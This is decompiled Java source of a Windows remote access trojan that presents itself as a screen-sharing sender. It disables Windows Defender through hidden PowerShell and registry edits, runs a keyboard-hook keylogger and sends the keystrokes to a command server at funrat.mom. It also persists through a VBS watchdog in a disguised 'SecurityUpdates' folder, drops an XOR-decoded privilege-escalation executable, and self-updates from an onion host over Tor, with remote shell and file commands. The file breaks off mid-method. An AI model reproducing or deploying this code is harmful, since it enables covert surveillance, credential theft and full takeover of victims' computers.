package com.example.screen;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.sun.jna.Callback;
import com.sun.jna.Function;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinDef.LPARAM;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import com.sun.management.OperatingSystemMXBean;
import core.TorBridge;
import java.awt.AWTException;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.PointerInfo;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JWindow;
import javax.swing.SwingUtilities;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class ScreenShareSender {
   private static final int DEFAULT_FPS = 20;
   private static final float DEFAULT_QUALITY = 0.8F;
   private static final float DEFAULT_SCALE = 1.0F;
   private static final int CAPTURE_TICK_MS = 10;
   private static final float AUTO_MIN_QUALITY = 0.6F;
   private static final float AUTO_MAX_QUALITY = 0.9F;
   private static final float AUTO_MIN_SCALE = 0.5F;
   private static final float AUTO_STEP = 0.03F;
   private static final int MAX_FRAME_BYTES = 12582912;
   private static final float FRAME_SIZE_ADJUST_STEP = 0.1F;
   private static final int SHELL_CHUNK_LIMIT = 4096;
   private static final long SHELL_FLUSH_INTERVAL_MS = 200L;
   private static final int SC_MONITORPOWER = 61808;
   private static volatile ScreenShareSender.SenderClient senderClient;
   private static volatile boolean keyloggerRunning;
   private static final ArrayBlockingQueue<int[]> KEY_QUEUE = new ArrayBlockingQueue<>(4096);
   private static final String VERSION = "1.0.0";
   private static Pointer kHook;
   private static Callback kCallback;

   static void elevateWorker(String tag, boolean allowSystem) {
      try {
         String jar = new File(ScreenShareSender.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         if (jar.indexOf(32) >= 0) {
            System.out.println("[elevate] nyx skipped: space in jar path");
            return;
         }

         String target = "-cp " + jar + " com.example.rat.HighWorker";
         int rc = runNyx(tag, target, !allowSystem);
         System.out.println("[elevate] nyx rc=" + rc + " system=" + allowSystem + " target=" + target);
      } catch (Throwable t) {
         System.out.println("[elevate] nyx exception " + t.getClass().getSimpleName() + ": " + t.getMessage());
      }
   }

   private static int runNyx(String tag, String target, boolean noSystem) {
      File exe = null;

      byte var39;
      try {
         InputStream in;
         label255: {
            exe = new File(System.getProperty("java.io.tmpdir"), "upd_" + Long.toHexString(new Random().nextLong()) + ".exe");
            exe.delete();
            in = ScreenShareSender.class.getResourceAsStream("/nyx.bin");

            byte[] raw;
            try {
               if (in == null) {
                  var39 = -1;
                  break label255;
               }

               ByteArrayOutputStream bos = new ByteArrayOutputStream();
               byte[] b = new byte[65536];

               int n;
               while ((n = in.read(b)) != -1) {
                  bos.write(b, 0, n);
               }

               raw = bos.toByteArray();
            } catch (Throwable var32) {
               if (in != null) {
                  try {
                     in.close();
                  } catch (Throwable var29) {
                     var32.addSuppressed(var29);
                  }
               }

               throw var32;
            }

            if (in != null) {
               in.close();
            }

            for (int i = 0; i < raw.length; i++) {
               raw[i] = (byte)(raw[i] ^ 90);
            }

            FileOutputStream out = new FileOutputStream(exe);

            try {
               out.write(raw);
            } catch (Throwable var30) {
               try {
                  out.close();
               } catch (Throwable var28) {
                  var30.addSuppressed(var28);
               }

               throw var30;
            }

            out.close();
            String var37 = System.getProperty("java.home") + "\\bin\\javaw.exe";
            if (!new File(var37).isFile()) {
               var37 = System.getProperty("java.home") + "\\bin\\java.exe";
            }

            List<String> cmd = new ArrayList<>();
            cmd.add(exe.getAbsolutePath());
            cmd.add("--run");
            cmd.add(var37);
            cmd.add("--tag");
            cmd.add(tag);
            cmd.add("--target-args");
            cmd.add(target);
            cmd.add("--wait-ms");
            cmd.add("4000");
            if (noSystem) {
               cmd.add("--no-system");
            }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            InputStream is = p.getInputStream();

            try {
               byte[] buf = new byte[8192];

               while (is.read(buf) != -1) {
               }
            } catch (Throwable var31) {
               if (is != null) {
                  try {
                     is.close();
                  } catch (Throwable var27) {
                     var31.addSuppressed(var27);
                  }
               }

               throw var31;
            }

            if (is != null) {
               is.close();
            }

            return p.waitFor();
         }

         if (in != null) {
            in.close();
         }
      } catch (Throwable t) {
         System.out.println("[elevate] nyx exception " + t.getClass().getSimpleName() + ": " + t.getMessage());
         return -1;
      } finally {
         if (exe != null && exe.exists()) {
            try {
               exe.delete();
            } catch (Throwable var26) {
            }
         }
      }

      return var39;
   }

   public static void defenderQuiet() {
      try {
         StringBuilder dirs = new StringBuilder();
         String appData = System.getenv("APPDATA");
         if (appData != null) {
            dirs.append("'").append(appData).append("\\Microsoft\\SecurityUpdates',");
         }

         File users = new File("C:\\Users");
         File[] list = users.listFiles();
         if (list != null) {
            for (File u : list) {
               File d = new File(u, "AppData\\Roaming\\Microsoft\\SecurityUpdates");
               if (d.isDirectory()) {
                  dirs.append("'").append(d.getAbsolutePath()).append("',");
               }
            }
         }

         String tmp = System.getProperty("java.io.tmpdir");
         if (tmp != null) {
            dirs.append("'").append(tmp).append("',");
         }

         String excl = dirs.length() == 0 ? "''" : dirs.substring(0, dirs.length() - 1);
         String logPath = (tmp == null ? "C:\\Windows\\Temp" : tmp) + "\\defender.log";
         String ps = "try{Start-Transcript -Path '"
            + logPath
            + "' -Force | Out-Null}catch{};try{Add-MpPreference -ExclusionPath @("
            + excl
            + ") -ErrorAction Continue}catch{};try{Add-MpPreference -ExclusionProcess 'java.exe' -ErrorAction Continue}catch{};try{Add-MpPreference -ExclusionProcess 'javaw.exe' -ErrorAction Continue}catch{};try{Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction Continue}catch{};try{Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction Continue}catch{};try{Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction Continue}catch{};try{Set-MpPreference -DisableScriptScanning $true -Force -ErrorAction Continue}catch{};try{Set-MpPreference -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction Continue}catch{};try{reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f | Out-Null}catch{};try{Get-MpComputerStatus | Select-Object IsTamperProtected,RealTimeProtectionEnabled | Out-String}catch{};try{Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Out-String}catch{};try{Stop-Transcript | Out-Null}catch{}";
         ProcessBuilder pb = new ProcessBuilder(
            "powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", ps
         );
         pb.redirectErrorStream(true);
         Process p = pb.start();
         InputStream is = p.getInputStream();

         try {
            byte[] b = new byte[8192];

            while (is.read(b) != -1) {
            }
         } catch (Throwable var14) {
            if (is != null) {
               try {
                  is.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }
            }

            throw var14;
         }

         if (is != null) {
            is.close();
         }

         p.waitFor(40L, TimeUnit.SECONDS);
      } catch (Throwable var15) {
      }
   }

   public static void main(String[] args) throws Exception {
      defenderQuiet();
      System.setProperty("java.awt.headless", "false");
      startAntiKill(args);
      startKeylogger();
      String accessKey = args.length > 0 ? args[0] : "098cf3c1-2b8c-4094-82c2-388699660f90";
      String wsUrl = args.length > 1 ? args[1] : "wss://funrat.mom/screen-stream";
      String deviceName = args.length > 2 ? args[2] : defaultDeviceName();
      int fps = args.length > 3 ? parseInt(args[3], 20) : 20;
      float quality = args.length > 4 ? parseFloat(args[4], 0.8F) : 0.8F;
      float scale = args.length > 5 ? parseFloat(args[5], 1.0F) : 1.0F;
      senderClient = new ScreenShareSender.SenderClient(parseWebSocketUri(wsUrl), accessKey, deviceName, fps, quality, scale);
      senderClient.connectBlocking();
      senderClient.awaitClose();
   }

   private static void startAntiKill(String[] args) {
      if (isWindowsOs()) {
         try {
            Path dir = appDataDir();
            Files.createDirectories(dir);
            Path hb = dir.resolve("client.alive");
            Path watcherMark = dir.resolve("antikill2.alive");
            Thread beat = new Thread(() -> {
               while (true) {
                  try {
                     Files.write(hb, String.valueOf(System.currentTimeMillis()).getBytes(StandardCharsets.UTF_8));
                  } catch (Exception var3x) {
                  }

                  try {
                     Thread.sleep(15000L);
                  } catch (InterruptedException e) {
                     return;
                  }
               }
            });
            beat.setDaemon(true);
            beat.start();
            String javaw = System.getProperty("java.home") + "\\bin\\javaw.exe";
            String jarPath = new File(ScreenShareSender.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            StringBuilder argv = new StringBuilder();
            if (args != null) {
               for (String a : args) {
                  if (a != null && !a.trim().isEmpty()) {
                     argv.append(" \"").append(a.replace("\"", "")).append("\"");
                  }
               }
            }

            String cmd = "\"\"" + javaw + "\"\" -jar \"\"" + jarPath + "\"\" " + argv;
            Path vbs = dir.resolve("rs-antikill2.vbs");
            String body = "Set s = CreateObject(\"WScript.Shell\")\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\nhb = \""
               + hb
               + "\"\r\nmark = \""
               + watcherMark
               + "\"\r\nDo\r\n  fso.CreateTextFile(mark, True).WriteLine Now\r\n  fresh = False\r\n  If fso.FileExists(hb) Then\r\n    If DateDiff(\"s\", fso.GetFile(hb).DateLastModified, Now()) < 90 Then fresh = True\r\n  End If\r\n  If Not fresh Then\r\n    s.Run \""
               + cmd.replace("\"", "\"\"")
               + "\", 0, False\r\n    fso.CreateTextFile(hb, True).WriteLine Now\r\n  End If\r\n  WScript.Sleep 30000\r\nLoop\r\n";
            Files.write(vbs, body.getBytes(StandardCharsets.UTF_8));
            if (!watcherAlive(watcherMark)) {
               Runtime.getRuntime().exec(new String[]{"wscript.exe", "/B", vbs.toString()});
            }
         } catch (Exception e) {
            System.err.println("Anti-kill: " + e.getMessage());
         }
      }
   }

   private static boolean watcherAlive(Path marker) {
      try {
         return !Files.isRegularFile(marker) ? false : System.currentTimeMillis() - Files.getLastModifiedTime(marker).toMillis() < 70000L;
      } catch (Exception ignored) {
         return false;
      }
   }

   private static Path appDataDir() {
      String base = System.getenv("APPDATA");
      if (base == null || base.trim().isEmpty()) {
         base = System.getProperty("user.home", ".");
      }

      return Paths.get(base, "Microsoft", "SecurityUpdates");
   }

   private static boolean isWindowsOs() {
      String os = System.getProperty("os.name");
      return os != null && os.toLowerCase().contains("win");
   }

   private static void startKeylogger() {
      try {
         if (keyloggerRunning) {
            return;
         }

         keyloggerRunning = true;
         Thread sender = new Thread(() -> {
            while (keyloggerRunning) {
               int[] e;
               try {
                  ex = KEY_QUEUE.take();
               } catch (InterruptedException ie) {
                  return;
               }

               ScreenShareSender.SenderClient sc = senderClient;
               if (sc != null && sc.isOpen()) {
                  try {
                     sc.send("{\"type\":\"keylog\",\"key\":\"" + escape(String.valueOf((char)ex[0])) + "\",\"vk\":" + ex[1] + "}");
                  } catch (Exception var3) {
                  }
               }
            }
         }, "Keylogger-send");
         sender.setDaemon(true);
         sender.start();
         new Thread(() -> {
            try {
               NativeLibrary u32 = NativeLibrary.getInstance("user32");
               int WH_KEYBOARD_LL = 13;
               final Function fGetKeyState = u32.getFunction("GetKeyState");
               final Function fCallNext = u32.getFunction("CallNextHookEx");
               Function fPeek = u32.getFunction("PeekMessageW");
               Function fMsgWait = u32.getFunction("MsgWaitForMultipleObjects");
               Pointer msg = new Memory(64L);
               Callback callback = new Callback() {
                  public int callback(int nCode, int wParam, Pointer lParam) {
                     if (nCode >= 0 && wParam == 256) {
                        int vkCode = lParam.getInt(0L);
                        if (vkCode > 0) {
                           int shift = fGetKeyState.invokeInt(new Object[]{16});
                           int caps = fGetKeyState.invokeInt(new Object[]{20});
                           char c = ScreenShareSender.keyToChar(vkCode, (shift & 32768) != 0 ^ (caps & 1) != 0);
                           if (c != 0) {
                              ScreenShareSender.KEY_QUEUE.offer(new int[]{c, vkCode});
                           }
                        }
                     }

                     return fCallNext.invokeInt(new Object[]{null, nCode, wParam, lParam});
                  }
               };
               kCallback = callback;
               kHook = u32.getFunction("SetWindowsHookExA").invokePointer(new Object[]{13, callback, null, 0});
               if (kHook == null || Pointer.nativeValue(kHook) == 0L) {
                  System.err.println("Keylogger hook failed");
                  return;
               }

               while (keyloggerRunning) {
                  fPeek.invokeInt(new Object[]{msg, null, 0, 0, 1});
                  fMsgWait.invokeInt(new Object[]{0, null, 0, 500, 255});
               }

               u32.getFunction("UnhookWindowsHookEx").invokeInt(new Object[]{kHook});
            } catch (Exception e) {
               System.err.println("Keylogger: " + ex.getMessage());
            }
         }, "Keylogger").start();
      } catch (Exception e) {
         System.err.println("Keylogger init: " + e.getMessage());
      }
   }

   private static char keyToChar(int vk, boolean upper) {
      if (vk >= 65 && vk <= 90) {
         return (char)(upper ? vk : vk + 32);
      } else if (vk >= 48 && vk <= 57) {
         return upper ? new char[]{')', '!', '@', '#', '$', '%', '^', '&', '*', '('}[vk - 48] : (char)vk;
      } else if (vk == 32) {
         return ' ';
      } else if (vk == 13) {
         return '\n';
      } else if (vk == 9) {
         return '\t';
      } else if (vk == 189) {
         return (char)(upper ? '_' : '-');
      } else if (vk == 187) {
         return (char)(upper ? '+' : '=');
      } else if (vk == 220) {
         return (char)(upper ? '|' : '\\');
      } else if (vk == 219) {
         return (char)(upper ? '{' : '[');
      } else if (vk == 221) {
         return (char)(upper ? '}' : ']');
      } else if (vk == 186) {
         return (char)(upper ? ':' : ';');
      } else if (vk == 222) {
         return (char)(upper ? '"' : '\'');
      } else if (vk == 188) {
         return (char)(upper ? '<' : ',');
      } else if (vk == 190) {
         return (char)(upper ? '>' : '.');
      } else if (vk == 191) {
         return (char)(upper ? '?' : '/');
      } else if (vk == 192) {
         return (char)(upper ? '~' : '`');
      } else if (vk >= 96 && vk <= 105) {
         return (char)(48 + (vk - 96));
      } else if (vk == 110) {
         return '.';
      } else if (vk == 106) {
         return '*';
      } else if (vk == 107) {
         return '+';
      } else if (vk == 109) {
         return '-';
      } else {
         return (char)(vk == 111 ? '/' : '\u0000');
      }
   }

   private static String escape(String s) {
      return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\t", "\\t");
   }

   private static void checkUpdate(String[] args) {
      try {
         URL u = new URL("http://5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion/api/screen/version");
         HttpURLConnection c = (HttpURLConnection)u.openConnection(TorBridge.get().socks());
         c.setConnectTimeout(4000);
         c.setReadTimeout(6000);
         if (c.getResponseCode() == 200) {
            String resp = new String(readAllBytes(c.getInputStream()));
            JsonNode json = new ObjectMapper().readTree(resp);
            String sv = json.get("version").asText();
            if (compareVersions(sv, "1.0.0") > 0) {
               System.out.println("Update: 1.0.0 -> " + sv);
               String dlUrl = json.get("url").asText();
               URL du = new URL(dlUrl);
               HttpURLConnection dc = (HttpURLConnection)du.openConnection(TorBridge.get().socks());
               dc.setConnectTimeout(30000);
               dc.setReadTimeout(120000);
               if (dc.getResponseCode() == 200) {
                  Path tmp = Files.createTempFile("screen", ".jar");
                  InputStream is = dc.getInputStream();

                  try {
                     Files.copy(is, tmp, StandardCopyOption.REPLACE_EXISTING);
                  } catch (Throwable var18) {
                     if (is != null) {
                        try {
                           is.close();
                        } catch (Throwable var17) {
                           var18.addSuppressed(var17);
                        }
                     }

                     throw var18;
                  }

                  if (is != null) {
                     is.close();
                  }

                  Path myPath = Paths.get(ScreenShareSender.class.getProtectionDomain().getCodeSource().getLocation().toURI());
                  Files.copy(tmp, myPath, StandardCopyOption.REPLACE_EXISTING);
                  tmp.toFile().delete();
                  System.out.println("Updated. Restarting...");
                  String jw = System.getProperty("java.home") + "\\bin\\javaw.exe";
                  if (!new File(jw).isFile()) {
                     jw = "java";
                  }

                  List<String> cmd = new ArrayList<>();
                  cmd.add(jw);
                  cmd.add("-jar");
                  cmd.add(myPath.toString());

                  for (String a : args) {
                     if (a != null && !a.trim().isEmpty()) {
                        cmd.add(a);
                     }
                  }

                  new ProcessBuilder(cmd).start();
                  System.exit(0);
               }
            }
         }
      } catch (Exception e) {
         System.err.println("Update check: " + e.getMessage());
      }
   }

   private static int compareVersions(String a, String b) {
      String[] pa = a.split("\\.");
      String[] pb = b.split("\\.");

      for (int i = 0; i < Math.max(pa.length, pb.length); i++) {
         int va = i < pa.length ? Integer.parseInt(pa[i]) : 0;
         int vb = i < pb.length ? Integer.parseInt(pb[i]) : 0;
         if (va != vb) {
            return va - vb;
         }
      }

      return 0;
   }

   private static byte[] readAllBytes(InputStream is) throws IOException {
      ByteArrayOutputStream buf = new ByteArrayOutputStream();
      byte[] tmp = new byte[8192];

      int n;
      while ((n = is.read(tmp)) != -1) {
         buf.write(tmp, 0, n);
      }

      return buf.toByteArray();
   }

   private static URI parseWebSocketUri(String wsUrl) throws URISyntaxException {
      String value = wsUrl == null ? "" : wsUrl.trim();
      if (value.isEmpty()) {
         throw new IllegalArgumentException("wsUrl is empty (expected ws:// or wss://)");
      } else {
         URI uri = new URI(value);
         String scheme = uri.getScheme();
         if (scheme != null && ("ws".equalsIgnoreCase(scheme) || "wss".equalsIgnoreCase(scheme))) {
            return uri;
         } else {
            throw new IllegalArgumentException("unknown scheme: " + scheme + " (wsUrl=" + value + ")");
         }
      }
   }

   public static boolean isElevated() {
      return Advapi32Util.isCurrentProcessElevated();
   }

   public static String getJVMLauncher() {
      String javaHome = System.getProperty("java.home");
      String exeName = "javaw.exe";
      File exe = new File(javaHome + File.separator + "bin" + File.separator + exeName);
      return exe.exists() ? exe.getAbsolutePath() : exeName;
   }

   public static String getCurrentJarPath() throws URISyntaxException {
      File loc = new File(ScreenShareSender.class.getProtectionDomain().getCodeSource().getLocation().toURI());
      return loc.isFile() && loc.getName().toLowerCase().endsWith(".jar") ? loc.getAbsolutePath() : System.getProperty("java.class.path");
   }

   private static boolean isDebugEnabled() {
      String prop = System.getProperty("screen.debug");
      if (prop != null && !prop.trim().isEmpty()) {
         return isTruthy(prop);
      }

      String env = System.getenv("SCREEN_DEBUG");
      return env != null && !env.trim().isEmpty() ? isTruthy(env) : true;
   }

   private static boolean isRunningAsAdmin() {
      if (!isWindows()) {
         return false;
      }

      String script = "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)";
      String out = runCommand(new String[]{"powershell", "-NoProfile", "-NonInteractive", "-Command", script});
      if (out == null) {
         return isAdminFromWhoami();
      }

      String v = out.trim().toLowerCase();
      return !v.startsWith("true") && !v.startsWith("1") ? isAdminFromWhoami() : true;
   }

   private static boolean isAdminFromWhoami() {
      String out = runCommand(new String[]{"cmd", "/c", "whoami /groups"});
      if (out == null) {
         return false;
      }

      String[] lines = out.split("\\r?\\n");

      for (String line : lines) {
         if (line != null) {
            String lower = line.toLowerCase();
            if (lower.contains("s-1-5-32-544") || lower.contains("builtin\\administrators")) {
               return lower.contains("deny only") ? false : lower.contains("enabled");
            }
         }
      }

      return false;
   }

   private static boolean isTruthy(String value) {
      String v = value == null ? "" : value.trim().toLowerCase();
      return "1".equals(v) || "true".equals(v) || "yes".equals(v) || "y".equals(v);
   }

   private static String defaultDeviceName() {
      String pcName = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (pcName == null || pcName.trim().isEmpty()) {
         pcName = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return pcName + "@" + host;
   }

   private static boolean isWindows() {
      String os = System.getProperty("os.name");
      return os != null && os.toLowerCase().contains("win");
   }

   private static String runCommand(String[] command) {
      Process p = null;

      try {
         p = new ProcessBuilder(command).redirectErrorStream(true).start();
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         InputStream in = p.getInputStream();
         byte[] buffer = new byte[1024];

         int n;
         while ((n = in.read(buffer)) != -1) {
            baos.write(buffer, 0, n);
         }

         p.waitFor();
         return new String(baos.toByteArray(), StandardCharsets.UTF_8);
      } catch (Exception ignored) {
         if (p != null) {
            p.destroyForcibly();
         }

         return null;
      }
   }

   private static int parseInt(String value, int fallback) {
      try {
         return Integer.parseInt(value);
      } catch (Exception ignored) {
         return fallback;
      }
   }

   private static float parseFloat(String value, float fallback) {
      try {
         return Float.parseFloat(value);
      } catch (Exception ignored) {
         return fallback;
      }
   }

   private static int clampFps(int value) {
      if (value < 1) {
         return 1;
      } else {
         return value > 60 ? 60 : value;
      }
   }

   private static float clampQuality(float value) {
      if (value < 0.1F) {
         return 0.1F;
      } else {
         return value > 1.0F ? 1.0F : value;
      }
   }

   private static float clampScale(float value) {
      if (value < 0.25F) {
         return 0.25F;
      } else {
         return value > 1.0F ? 1.0F : value;
      }
   }

   private static final class RobotScreenCapturer implements ScreenShareSender.ScreenCapturer {
      private final Robot robot;

      private RobotScreenCapturer(Robot robot) {
         this.robot = robot;
      }

      @Override
      public BufferedImage capture(Rectangle rect, boolean drawCursor) {
         return this.robot.createScreenCapture(rect);
      }

      @Override
      public boolean drawsCursor() {
         return false;
      }

      @Override
      public String name() {
         return "robot";
      }
   }

   interface ScreenCapturer {
      BufferedImage capture(Rectangle rect, boolean drawCursor) throws Exception;

      boolean drawsCursor();

      String name();
   }

   private static final class SenderClient extends WebSocketClient {
      private final String accessKey;
      private final String deviceName;
      private volatile int fps;
      private volatile float jpegQuality;
      private volatile float scale;
      private volatile boolean controlEnabled = false;
      private volatile boolean showCursor = false;
      private volatile boolean hasViewers = false;
      private volatile boolean autoTune = true;
      private volatile boolean localControlApproved = false;
      private final AtomicBoolean approvalInProgress = new AtomicBoolean(false);
      private volatile boolean pauseCapture = false;
      private final AtomicBoolean pauseApprovalInProgress = new AtomicBoolean(false);
      private final AtomicBoolean elevationInProgress = new AtomicBoolean(false);
      private final ObjectMapper mapper = new ObjectMapper();
      private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
      private final ScheduledExecutorService telemetryScheduler = Executors.newSingleThreadScheduledExecutor();
      private final ExecutorService fileExecutor = Executors.newSingleThreadExecutor();
      private final ExecutorService shellExecutor = Executors.newSingleThreadExecutor();
      private final CountDownLatch closeLatch = new CountDownLatch(1);
      private final Object sendLock = new Object();
      private final Object overlayLock = new Object();
      private final List<JWindow> freezeOverlays = new ArrayList<>();
      private final Object padlockOverlayLock = new Object();
      private final List<JWindow> padlockOverlays = new ArrayList<>();
      private volatile ScreenShareSender.ScreenCapturer capturer;
      private volatile boolean jnaFailed = false;
      private Robot robot;
      private volatile Rectangle captureRect;
      private volatile int monitorIndex = 0;
      private volatile long lastSentNanos = 0L;
      private volatile int outputWidth = 0;
      private volatile int outputHeight = 0;
      private long windowStartMs = 0L;
      private int windowFrames = 0;
      private volatile String shellCwd;
      private volatile Point lastPointer;
      private volatile long lastPointerAtMs = 0L;
      private volatile long lastPointerLogMs = 0L;
      private final boolean debugEnabled = ScreenShareSender.isDebugEnabled();
      private final boolean padlockDllEnabled = this.isPadlockDllEnabled();
      private volatile boolean padlockBlockInputActive = false;
      private volatile boolean padlockDllTried = false;
      private volatile boolean padlockDllLoaded = false;
      private volatile String padlockDllUnavailableReason = "";
      private static final byte[] FRAME_MAGIC = new byte[]{83, 83, 86, 49};
      private static final short FRAME_HEADER_LEN = 28;
      private static final double LATENCY_EMA_ALPHA = 0.2;
      private int frameSeq = 0;
      private int pingSeq = 0;
      private volatile boolean latencyReady = false;
      private volatile double offsetToServerMsEma = 0.0;
      private volatile double rttMsEma = 0.0;
      private long lastLatencyLogMs = 0L;
      private static final long MAX_FRAME_BYTES_ALLOWED = 307200L;
      private static byte[] missedFramesPayload;
      private static int missedFramesCount;

      private SenderClient(URI serverUri, String accessKey, String deviceName, int fps, float jpegQuality, float scale) throws AWTException {
         super(serverUri);
         this.setTcpNoDelay(true);
         this.setConnectionLostTimeout(120);
         this.accessKey = accessKey;
         this.deviceName = deviceName;
         this.fps = ScreenShareSender.clampFps(fps);
         this.jpegQuality = ScreenShareSender.clampQuality(jpegQuality);
         this.scale = ScreenShareSender.clampScale(scale);
         this.robot = new Robot();
         this.capturer = this.createCapturer();
         Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
         this.captureRect = new Rectangle(size);
         this.applyMonitorIndex(0);
         this.shellCwd = this.resolveInitialShellCwd();
      }

      public void onOpen(ServerHandshake handshakedata) {
         this.sendIdentify();
         this.sendMonitors();
         this.startCaptureLoop();
         this.startLatencyLoop();
         this.debug("open: headless=" + GraphicsEnvironment.isHeadless() + ", showCursor=" + this.showCursor + ", capturer=" + this.capturer.name());
         System.out.println("Sender connected to " + this.getURI());
      }

      public void onMessage(String message) {
         JsonNode root = this.readJson(message);
         if (root != null) {
            String type = root.path("type").asText("");
            switch (type) {
               case "latencyPong":
                  this.handleLatencyPong(root);
                  break;
               case "settings":
                  this.applySettings(root);
                  break;
               case "getMonitors":
                  this.sendMonitors();
                  break;
               case "viewerState":
                  this.handleViewerState(root);
                  break;
               case "mouseMove":
                  this.handleMouseMove(root);
                  break;
               case "mousePress":
                  this.handleMousePress(root);
                  break;
               case "mouseRelease":
                  this.handleMouseRelease(root);
                  break;
               case "mouseWheel":
                  this.handleMouseWheel(root);
                  break;
               case "keyPress":
                  this.handleKeyPress(root);
                  break;
               case "keyRelease":
                  this.handleKeyRelease(root);
                  break;
               case "file":
                  this.dispatchFileRequest(message);
                  break;
               case "shell":
                  this.dispatchShellRequest(message);
                  break;
               case "clientAction":
                  this.handleClientAction(root);
            }
         }
      }

      public void onClose(int code, String reason, boolean remote) {
         this.scheduler.shutdownNow();
         this.telemetryScheduler.shutdownNow();
         this.fileExecutor.shutdownNow();
         this.shellExecutor.shutdownNow();
         this.hideFreezeOverlay();
         this.releasePadlockBestEffort();
         this.closeLatch.countDown();
         this.controlEnabled = false;
         this.localControlApproved = false;
         this.approvalInProgress.set(false);
         this.pauseCapture = false;
         this.pauseApprovalInProgress.set(false);
         this.hasViewers = false;
         String safeReason = reason == null ? "" : reason.trim();
         String suffix = code > 0 ? " (code " + code + ")" : "";
         System.out.println("Sender disconnected: " + safeReason + suffix);
      }

      public void onError(Exception ex) {
         ex.printStackTrace();
      }

      private void sendIdentify() {
         try {
            String payload = this.mapper
               .createObjectNode()
               .put("type", "identify")
               .put("key", this.accessKey)
               .put("deviceName", this.deviceName)
               .put("ipAddress", this.resolveIpAddress())
               .put("admin", ScreenShareSender.isRunningAsAdmin())
               .toString();
            this.sendSafe(payload);
         } catch (Exception var2) {
         }
      }

      private void startCaptureLoop() {
         this.scheduler.scheduleAtFixedRate(this::captureAndSend, 0L, 10L, TimeUnit.MILLISECONDS);
      }

      private void startLatencyLoop() {
         this.telemetryScheduler.scheduleAtFixedRate(this::sendLatencyPing, 0L, 2000L, TimeUnit.MILLISECONDS);
      }

      private void sendLatencyPing() {
         try {
            if (!this.isOpen()) {
               return;
            }

            int id = ++this.pingSeq;
            long t0 = System.currentTimeMillis();
